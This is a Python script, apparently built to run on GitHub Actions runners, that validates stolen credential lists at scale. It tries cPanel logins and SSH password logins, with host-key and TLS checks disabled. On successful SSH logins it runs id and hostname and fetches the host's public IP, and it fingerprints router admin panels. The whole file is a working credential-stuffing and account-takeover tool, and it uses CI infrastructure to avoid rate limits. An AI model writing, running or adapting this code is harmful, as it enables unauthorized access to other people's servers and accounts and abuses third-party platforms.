#!/usr/bin/env python3
"""Fleet runner for GitHub Actions. Clean datacenter egress, no Tor rate-limits.
Usage: run.py <job> <chunk> <chunks>
Jobs: cpanel | ssh | panels
Writes results to out/<job>-<chunk>.jsonl and a summary to out/summary.txt
"""
import os, sys, re, json, subprocess, time, urllib.request, urllib.parse, socket
from concurrent.futures import ThreadPoolExecutor, as_completed

JOB = sys.argv[1]
CHUNK = int(sys.argv[2])
CHUNKS = int(sys.argv[3])
OUT = "out"
os.makedirs(OUT, exist_ok=True)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"

def lines(path):
    with open(path) as f:
        return [l.rstrip("\n") for l in f if l.strip()]

def chunked(rows):
    return [r for i, r in enumerate(rows) if i % CHUNKS == CHUNK]

# ---------------- cPanel ----------------
def cpanel_one(hp, user, pw, timeout=25):
    host, port = hp.rsplit(":", 1)
    scheme = "https" if port in ("2083", "2087", "2086") else "http"
    url = f"{scheme}://{host}:{port}/login/?login_only=1"
    data = urllib.parse.urlencode({"user": user, "pass": pw}).encode()
    req = urllib.request.Request(url, data=data, headers={"User-Agent": UA})
    ctx = __import__("ssl")._create_unverified_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(4000).decode("utf-8", "ignore")
        if '"status":1' in body.replace(" ", "") or '"status": 1' in body:
            return ("LIVE", body[:300])
        if "One moment, please" in body or "please wait" in body.lower():
            return ("RATE_LIMITED", "")
        if "security_token" in body:
            return ("AUTH_FAIL", body[:200])
        if "<html" in body.lower() and "login" in body.lower():
            return ("AUTH_FAIL", "")
        return ("OTHER", body[:200])
    except Exception as e:
        return ("ERR:" + type(e).__name__, str(e)[:120])

# ---------------- SSH ----------------
def ssh_one(hp, user, pw, timeout=30):
    host, port = hp.rsplit(":", 1)
    cmd = ["sshpass", "-p", pw, "ssh",
           "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
           "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no",
           "-o", "NumberOfPasswordPrompts=1", "-o", "ConnectTimeout=20",
           "-p", port, "-l", user, host,
           "echo FLEET_OK; id; hostname; curl -s --max-time 10 https://api.ipify.org; echo; echo FLEET_END"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 15)
        out = (r.stdout or "") + (r.stderr or "")
        if "FLEET_OK" in out:
            ip = ""
            m = re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", out)
            if m: ip = m[-1]
            return ("LIVE", ip + " || " + out.replace("\n", " | ")[:400])
        if "Permission denied" in out: return ("AUTH_FAIL", "")
        if "Connection refused" in out: return ("REFUSED", "")
        if "timed out" in out.lower() or "timeout" in out.lower(): return ("TIMEOUT", "")
        return ("OTHER", out[:200])
    except subprocess.TimeoutExpired:
        return ("TIMEOUT", "")
    except Exception as e:
        return ("ERR:" + type(e).__name__, str(e)[:120])

# ---------------- panels ----------------
def http_get(url, timeout=20):
    ctx = __import__("ssl")._create_unverified_context()
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.getcode(), r.read(20000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        try: return e.code, e.read(8000).decode("utf-8", "ignore")
        except Exception: return e.code, ""
    except Exception as e:
        return 0, ""

FP = [("RouterOS", ("routeros", "mikrotik", "webfig")), ("OpenWrt", ("luci", "openwrt")),
      ("Ubiquiti", ("ubiquiti", "unifi", "airmax", "airos")),
      ("TP-Link", ("tp-link", "tplink", "archer")), ("Huawei", ("huawei", "hilink")),
      ("ZTE", ("zxhn", "zxic", "zte ")), ("Tenda", ("tenda",)),
      ("D-Link", ("d-link", "dlink", "dir-")), ("Netgear", ("netgear", "nighthawk")),
      ("Asus", ("asuswrt", "asuscomm", "rt-ac")), ("Fritz", ("fritz", "avm")),
      ("Zyxel", ("zyxel", "zywall")), ("Sagemcom", ("sagemcom",)),
      ("Mercusys", ("mercusys",)), ("Cisco", ("cisco", "linksys"))]

def panel_one(hp, creds):
    host, port = hp.rsplit(":", 1)
    for scheme in ("http", "https"):
        code, body = http_get(f"{scheme}://{host}:{port}/")
        if code:
            break
    if not code:
        return None
    title = ""
    t = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
    if t: title = re.sub(r"\s+", " ", t.group(1))[:80]
    low = (title + " " + body).lower()
    fp = "Unknown"
    for name, kws in FP:
        if any(k in low for k in kws): fp = name; break
    return {"hp": hp, "scheme": scheme, "code": code, "title": title, "fp": fp}

def main():
    t0 = time.time()
    results = []
    if JOB == "cpanel":
        rows = [l.split("|") for l in lines("creds/cpanel.txt") if l.count("|") == 2]
        rows = chunked(rows)
        print(f"[cpanel] chunk {CHUNK}/{CHUNKS}: {len(rows)} creds", flush=True)
        with ThreadPoolExecutor(max_workers=25) as ex:
            futs = {ex.submit(cpanel_one, hp, u, p): (hp, u, p) for hp, u, p in rows}
            for k, f in enumerate(as_completed(futs), 1):
                hp, u, p = futs[f]; v, detail = f.result()
                if v in ("LIVE", "RATE_LIMITED"):
                    print(f"  {v} {u}:{p} @ {hp}  {detail[:120]}", flush=True)
                results.append({"hp": hp, "user": u, "pw": p, "verdict": v, "detail": detail})
    elif JOB == "ssh":
        rows = [l.split("|") for l in lines("creds/ssh.txt") if l.count("|") == 2]
        rows = chunked(rows)
        print(f"[ssh] chunk {CHUNK}/{CHUNKS}: {len(rows)} creds", flush=True)
        with ThreadPoolExecutor(max_workers=12) as ex:
            futs = {ex.submit(ssh_one, hp, u, p): (hp, u, p) for hp, u, p in rows}
            for k, f in enumerate(as_completed(futs), 1):
                hp, u, p = futs[f]; v, detail = f.result()
                if v == "LIVE":
                    print(f"  LIVE {u}:{p} @ {hp}  {detail[:200]}", flush=True)
                results.append({"hp": hp, "user": u, "pw": p, "verdict": v, "detail": detail})
    elif JOB == "panels":
        rows = lines("creds/panels.txt")
        rows = chunked(rows)
        print(f"[panels] chunk {CHUNK}/{CHUNKS}: {len(rows)} endpoints", flush=True)
        with ThreadPoolExecutor(max_workers=30) as ex:
            futs = {}
            for r in rows:
                if "\t" in r:
                    hp, cred = r.split("\t", 1)
                    futs[ex.submit(panel_one, hp, [cred])] = hp
                else:
                    futs[ex.submit(panel_one, r, [])] = r
            for f in as_completed(futs):
                hp = futs[f]
                try: res = f.result()
                except Exception: res = None
                if res:
                    if res["fp"] not in ("Unknown",):
                        print(f"  PANEL {res['hp']:24} {res['fp']:10} {res['code']} {res['title'][:50]}", flush=True)
                    results.append(res)
    with open(f"{OUT}/{JOB}-{CHUNK}.jsonl", "w") as f:
        for r in results:
            f.write(json.dumps(r) + "\n")
    from collections import Counter
    c = Counter(r.get("verdict", r.get("fp")) for r in results)
    summary = f"{JOB} chunk {CHUNK}/{CHUNKS}: {len(results)} tested in {time.time()-t0:.0f}s :: {dict(c)}"
    print(summary, flush=True)
    open(f"{OUT}/summary-{JOB}-{CHUNK}.txt", "w").write(summary + "\n")

if __name__ == "__main__":
    main()